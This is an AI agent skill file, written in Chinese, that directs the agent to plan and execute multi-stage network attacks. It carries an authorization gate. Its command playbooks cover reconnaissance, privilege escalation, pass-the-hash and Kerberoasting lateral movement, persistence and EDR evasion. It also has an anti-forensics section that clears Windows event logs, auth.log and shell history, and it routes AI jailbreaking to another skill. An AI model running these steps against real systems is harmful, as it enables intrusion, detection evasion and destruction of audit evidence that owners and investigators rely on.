---
name: attack-chain
description: 多阶段攻击路径规划与执行的总指挥。编排各阶段、协调子 Skill、规划攻击路径。单阶段任务直接路由到专业 Skill。
category: 安全研究
---

# Attack Chain Orchestration / 攻击链编排

> Source: wuxian_pojia attack-chain/SKILL.md (完整执行版)  
> 不是"红队专属"——任何需要跨阶段组合的渗透/逆向场景都从这里开始。

## ACTION REQUIRED（读完后立刻执行）

1. `NOW`: 读取 `ops/role-map.md` — 以 **lead** 角色规划阶段，写入 specialist_roles
2. `NOW`: 按 `ops/scope-contract.md` 创建/更新 scope；`auth.status!=granted` 禁止 ACT
3. `NEXT`: 读取 `routing.md` Path Crossing 段，确认预设跨模块路径
4. `ACT`: 每阶段更新 timeline + workitems（`ops/timeline-workitem.md`）；发现提升为 Evidence/Finding（`ops/evidence-finding-path.md`）
5. 结束：报告必须含 Evidence 链

---

## 何时路由到本 Skill

以下场景**必须**先经过本 Skill 做全链路规划：

| 场景 | 为什么需要编排 |
|------|--------------|
| "帮我做一次完整的渗透测试" | 需要规划从信息收集到报告的全流程 |
| "从外网打到域控" | 跨越边界突破→提权→横向→AD 多个阶段 |
| "HW 攻防演练" | 需要完整攻击链 + 隐蔽性 + 痕迹清理 |
| "评估这个目标的攻击面" | 需要多维度信息收集 + 路径规划 |
| "我拿到了一个 webshell，下一步怎么办" | 需要从当前据点规划后续路径 |
| "帮我规划攻击路径" | 明确需要路径编排 |
| "从这个漏洞能打到什么程度" | 需要评估漏洞的链式利用价值 |
| "内网渗透全流程" | 横向移动 + 提权 + 域攻击组合 |
| "供应链攻击路径" | 跨组织多跳攻击 |

**单阶段任务不需要经过本 Skill**：
- 只做端口扫描 → 直接去 `pentest-tools/`
- 只做 SQL 注入 → 直接去 `pentest-tools/`
- 只做 APK 逆向 → 直接去 `apk-reverse/`
- 只做 AI 越狱 → 直接去 `llm-security/`

---

## 编排原则

### 本 Skill 的角色

```
用户提出多阶段任务
    ↓
attack-chain/SKILL.md（本文件）— 规划攻击路径、确定阶段顺序
    ↓
分发到具体子 Skill 执行：
    ├── pentest-tools/     → 工具调用、漏洞利用
    ├── apk-reverse/       → 移动端渗透
    ├── js-reverse/        → Web 前端突破
    ├── reverse-engineering/ → 二进制分析
    ├── ida-reverse/       → 深度逆向
    ├── malware-triage/    → 样本分析
    └── reverse_flow_skill/ → 全流程逆向
    ↓
每阶段完成后回到本 Skill 评估下一步
    ↓
全部完成 → 生成报告
```

### 路径规划决策树

```
拿到目标后：
1. 目标是什么？（Web/内网/云/移动/IoT）
2. 当前有什么？（外部视角/已有凭据/已有据点）
3. 最终目标是什么？（域控/数据/特定系统/证明影响）
4. 约束条件？（时间/隐蔽性/不可触碰的系统）
    ↓
根据以上信息规划最短路径
    ↓
一条路走不通 → 回到本 Skill 重新规划备选路径
```

---

## 完整攻击链阶段

### 一、信息收集阶段（Reconnaissance）

```bash
# 子域名发现
subfinder -d target.com -o subdomains.txt
# 存活探测
httpx -l subdomains.txt -status-code -title -o alive.txt
# 端口扫描
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**高价值目标**：测试环境（test/dev/staging）、证书透明度日志（crt.sh）、JS 文件中的 API Key

### 二、边界突破阶段（Initial Access）

| 漏洞类型 | 检测工具 | 攻击目的 |
|---------|---------|---------|
| SQL 注入 | sqlmap | 数据提取 → 写 shell → RCE |
| SSTI | 手工 | 模板注入 → RCE |
| 文件上传 | 手工 + Burp | Webshell → 反弹 shell |
| SSRF | 手工 | 内网探测 → 云元数据 → AK/SK |
| 未授权访问 | nuclei | Spring Actuator / Redis / Nacos |

### 三、权限提升阶段（Privilege Escalation）

**Windows**:
```powershell
# Potato 系列（SeImpersonate）
whoami /priv | findstr "SeImpersonate"
.\GodPotato.exe -cmd "cmd /c whoami"
# 自动化检测
.\winPEAS.exe
```

**Linux**:
```bash
# SUID 检测
find / -perm -4000 -type f 2>/dev/null
# sudo 滥用
sudo -l
# 自动化检测
./linpeas.sh
```

### 四、横向移动阶段（Lateral Movement）

```bash
# PTH 横向
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH>
# Kerberoasting
GetUserSPNs.py -request -dc-ip dc_ip domain/user:password
# BloodHound
bloodhound-python -d domain.local -u user -p password -c All
```

### 五、权限维持阶段（Persistence）

| 技术 | 隐蔽性 | 检测难度 |
|------|:------:|:------:|
| WMI 事件订阅 | 高 | 高 |
| Golden Ticket | 极高 | 极高 |
| DLL 劫持 | 高 | 中 |
| 计划任务 | 中 | 低 |

### 六、EDR/AV 绕过（Evasion）

| 层面 | 技术 |
|------|------|
| 静态检测 | 加密/混淆/自定义加载器 |
| 行为检测 | 间接系统调用/Unhooking |
| 内存检测 | 模块踩踏/堆加密 |
| 网络检测 | 域前置/合法服务隧道 |

### 七、痕迹清理（Anti-Forensics）

```bash
# Windows 日志清除
wevtutil cl Security
wevtutil cl System
# Linux 日志清除
echo > /var/log/auth.log
history -c && history -w
```

---

## 工具速查

`subfinder` `amass` `httpx` `nmap` `nuclei` `sqlmap` `burpsuite` `mimikatz` `crackmapexec` `impacket` `bloodhound` `winPEAS` `linpeas`

---

## 与本包其他 Skill 的关系

| 需求 | 路由到 |
|------|--------|
| Web 漏洞深度利用 | `pentest-tools/SKILL.md` |
| 逆向分析恶意样本 | `reverse-engineering/SKILL.md` |
| APK 逆向 | `apk-reverse/SKILL.md` |
| JS 前端签名绕过 | `js-reverse/SKILL.md` |
| IDA 深度逆向 | `ida-reverse/SKILL.md` |
| 二进制差分 | `binary-diff/SKILL.md` |
| 恶意代码分诊 | `malware-triage/SKILL.md` |
| 全流程逆向 | `reverse_flow_skill/SKILL.md` |
| 游戏破解 | `game-hacking/SKILL.md` |
| EDR 绕过 | `edr-bypass-re/SKILL.md` |
| LLM/AI 攻击 | `llm-security/SKILL.md` |
| 固件分析 | `firmware-pentest/SKILL.md` |
| 渗透测试工具 | `pentest-tools/SKILL.md` |

---

## 任务完成自检（声称完成前 MUST 通过）

- [ ] 是否执行了工作流中的每一步（不是只阅读）？
- [ ] 是否产出了可复现证据（命令/脚本/报告）？
- [ ] 是否每阶段更新了 timeline + workitems？
- [ ] 是否所有 Finding 都有 Evidence 链？
- [ ] 是否规划了备选路径（当前路径走不通时）？
